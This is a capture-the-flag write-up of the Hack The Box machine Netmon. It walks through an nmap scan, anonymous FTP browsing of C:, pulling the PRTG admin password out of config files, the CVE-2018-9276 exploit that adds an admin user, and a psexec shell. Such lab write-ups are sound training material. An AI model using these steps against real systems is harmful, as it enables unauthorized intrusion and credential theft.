<hr />

<h2 id="quick-summary">Quick Summary</h2>
<p><br /> Hey guys today Netmon retired and here’s my writeup about it. It was a very easy machine that’s everything I can say about it. It’s a Windows box and its ip is 10.10.10.152, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">netmon.htb</code>. Let’s jump right in !
<img src="/images/hackthebox/netmon/0.png" alt="" /></p>
<hr />

<h2 id="nmap">Nmap</h2>
<p><br /> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
<code class="highlighter-rouge">nmap -sV -sT -sC netmon.htb</code>
<img src="/images/hackthebox/netmon/1.png" alt="" />
<br /> We got <code class="highlighter-rouge">ftp</code> on port 21, <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">smb</code>. The most interesting thing is that anonymous login is allowed on <code class="highlighter-rouge">ftp</code> and obviously it’s running on <code class="highlighter-rouge">C:</code> !</p>
<hr />

<h2 id="ftp-user-flag">FTP, User Flag</h2>
<p><br /> I checked that <code class="highlighter-rouge">ftp</code> server and got the user flag for <code class="highlighter-rouge">Public</code> :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:18AM                 1024 .rnd
02-25-19  10:15PM       &lt;DIR&gt;          inetpub
07-16-16  09:18AM       &lt;DIR&gt;          PerfLogs
02-25-19  10:56PM       &lt;DIR&gt;          Program Files
02-03-19  12:28AM       &lt;DIR&gt;          Program Files (x86)
02-03-19  08:08AM       &lt;DIR&gt;          Users
02-25-19  11:49PM       &lt;DIR&gt;          Windows
226 Transfer complete.
ftp&gt; cd Users
250 CWD command successful.
ftp&gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &lt;DIR&gt;          Administrator
06-28-19  06:43AM       &lt;DIR&gt;          Public
226 Transfer complete.
ftp&gt; cd Public
250 CWD command successful.
ftp&gt; ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &lt;DIR&gt;          Documents
07-16-16  09:18AM       &lt;DIR&gt;          Downloads
07-16-16  09:18AM       &lt;DIR&gt;          Music
07-16-16  09:18AM       &lt;DIR&gt;          Pictures
06-28-19  06:49AM                   82 tester.txt
02-03-19  12:35AM                   33 user.txt
07-16-16  09:18AM       &lt;DIR&gt;          Videos
226 Transfer complete.
ftp&gt; get user.txt
local: user.txt remote: user.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
WARNING! 1 bare linefeeds received in ASCII mode
File may not have transferred correctly.
226 Transfer complete.
33 bytes received in 0.07 secs (0.4790 kB/s)
ftp&gt;
</code></pre></div></div>
<p><img src="/images/hackthebox/netmon/2.png" alt="" />
<br /> We owned user.
<br /></p>
<hr />

<p><br /> PRTG Credentials
<br /> I checked the <code class="highlighter-rouge">http</code> service and found a web application called PRTG Network Monitor. However we need credentials to access the application.
<img src="/images/hackthebox/netmon/3.png" alt="" />
<br /> We have access to <code class="highlighter-rouge">C:</code> through the <code class="highlighter-rouge">ftp</code> server so we can search for credentials there. I searched for the place where PRTG configuration files are saved and found it was in <code class="highlighter-rouge">C:\Users\All Users\Application Data\Paessler\PRTG Network Monitor</code> so I went there and downloaded the configuration files :</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/netmon# ftp netmon.htb
Connected to netmon.htb.
220 Microsoft FTP Service
Name (netmon.htb:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password. 
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp&gt; cd Users
250 CWD command successful.
ftp&gt; ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-25-19  11:44PM       &lt;DIR&gt;          Administrator
07-16-16  09:28AM       &lt;DIR&gt;          All Users
02-03-19  08:05AM       &lt;DIR&gt;          Default
07-16-16  09:28AM       &lt;DIR&gt;          Default User
07-16-16  09:16AM                  174 desktop.ini
06-28-19  06:43AM       &lt;DIR&gt;          Public
226 Transfer complete.
ftp&gt; cd "All Users"
250 CWD command successful.
ftp&gt; ls -al
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  08:05AM       &lt;DIR&gt;          Application Data
02-03-19  08:05AM       &lt;DIR&gt;          Desktop
02-03-19  08:05AM       &lt;DIR&gt;          Documents
02-03-19  12:15AM       &lt;DIR&gt;          Licenses
11-20-16  10:36PM       &lt;DIR&gt;          Microsoft
02-03-19  12:18AM       &lt;DIR&gt;          Paessler
02-03-19  08:05AM       &lt;DIR&gt;          regid.1991-06.com.microsoft
07-16-16  09:18AM       &lt;DIR&gt;          SoftwareDistribution
02-03-19  08:05AM       &lt;DIR&gt;          Start Menu
02-03-19  12:15AM       &lt;DIR&gt;          TEMP
02-03-19  08:05AM       &lt;DIR&gt;          Templates
11-20-16  10:19PM       &lt;DIR&gt;          USOPrivate
11-20-16  10:19PM       &lt;DIR&gt;          USOShared
02-25-19  10:56PM       &lt;DIR&gt;          VMware
226 Transfer complete.
ftp&gt; cd "Application Data/Paessler/PRTG Network Monitor"
250 CWD command successful.
ftp&gt; ls -la
200 PORT command successful.
125 Data connection already open; Transfer starting.
02-03-19  12:40AM       &lt;DIR&gt;          Configuration Auto-Backups
06-28-19  06:24AM       &lt;DIR&gt;          Log Database
02-03-19  12:18AM       &lt;DIR&gt;          Logs (Debug)
02-03-19  12:18AM       &lt;DIR&gt;          Logs (Sensors)
02-03-19  12:18AM       &lt;DIR&gt;          Logs (System)
06-28-19  06:24AM       &lt;DIR&gt;          Logs (Web Server)
02-25-19  08:01PM       &lt;DIR&gt;          Monitoring Database
06-28-19  06:54AM              1287578 PRTG Configuration.dat
02-25-19  10:54PM              1189697 PRTG Configuration.old
07-14-18  03:13AM              1153755 PRTG Configuration.old.bak
06-28-19  06:25AM              1647701 PRTG Graph Data Cache.dat
02-25-19  11:00PM       &lt;DIR&gt;          Report PDFs
02-03-19  12:18AM       &lt;DIR&gt;          System Information Database
02-03-19  12:40AM       &lt;DIR&gt;          Ticket Database
02-03-19  12:18AM       &lt;DIR&gt;          ToDo Database
226 Transfer complete.
ftp&gt; get "PRTG Configuration.dat"
local: PRTG Configuration.dat remote: PRTG Configuration.dat
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1287578 bytes received in 3.43 secs (366.5319 kB/s)
ftp&gt; get "PRTG Configuration.old"
local: PRTG Configuration.old remote: PRTG Configuration.old
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1189697 bytes received in 3.05 secs (380.7779 kB/s)
ftp&gt; get "PRTG Configuration.old.bak"
local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1153755 bytes received in 3.04 secs (370.2494 kB/s)
ftp&gt;
</code></pre></div></div>
<p><br /> Knowing that the default admin user for PRTG is <code class="highlighter-rouge">prtgadmin</code> I searched for that string in the 3 configuration files :
<code class="highlighter-rouge">cat * | grep -A 20 -B 20 "prtgadmin"</code>
<img src="/images/hackthebox/netmon/4.png" alt="" />
<br /> I got the password which was <code class="highlighter-rouge">PrTg@dmin2018</code> :
<img src="/images/hackthebox/netmon/5.png" alt="" />
<br /> However it didn’t work, after some attempts I changed it to <code class="highlighter-rouge">PrTg@dmin2019</code> and it worked :
<img src="/images/hackthebox/netmon/6.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/netmon/7.png" alt="" /></p>
<hr />

<h2 id="rce-root-flag">RCE, Root Flag</h2>
<p><br /> After searching for authenticated exploits I found <a href="https://github.com/wildkindcc/CVE-2018-9276"><code class="highlighter-rouge">CVE-2018-9276</code></a> which was an authenticated <code class="highlighter-rouge">RCE</code> vulnerability. I used <a href="https://github.com/M4LV0/PRTG-Network-Monitor-RCE">this exploit</a> which exploits the <code class="highlighter-rouge">RCE</code> and creates a new Administrator user (This works because PRTG runs as <code class="highlighter-rouge">system</code>) :
<img src="/images/hackthebox/netmon/8.png" alt="" />
<br /> New user credentials : <code class="highlighter-rouge">pentest:P3nT3st!</code>. I used <code class="highlighter-rouge">psexec.py</code> from <a href="https://github.com/SecureAuthCorp/impacket"><code class="highlighter-rouge">impacket</code></a> to get a shell :
<code class="highlighter-rouge">psexec.py pentest:'P3nT3st!'@netmon.htb</code>
<img src="/images/hackthebox/netmon/9.png" alt="" />
<br /> And we owned root !
<br /> That’s it , Feedback is appreciated !
<br /> Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham">@Ahm3d_H3sham</a>
<br /> Thanks for reading.
<br />
<br />
<br /> Previous Hack The Box write-up : <a href="/hack-the-box/querier/">Hack The Box - Querier</a>
<br /> Next Hack The Box write-up : <a href="/hack-the-box/hackback/">Hack The Box - Hackback</a></p>
<hr />

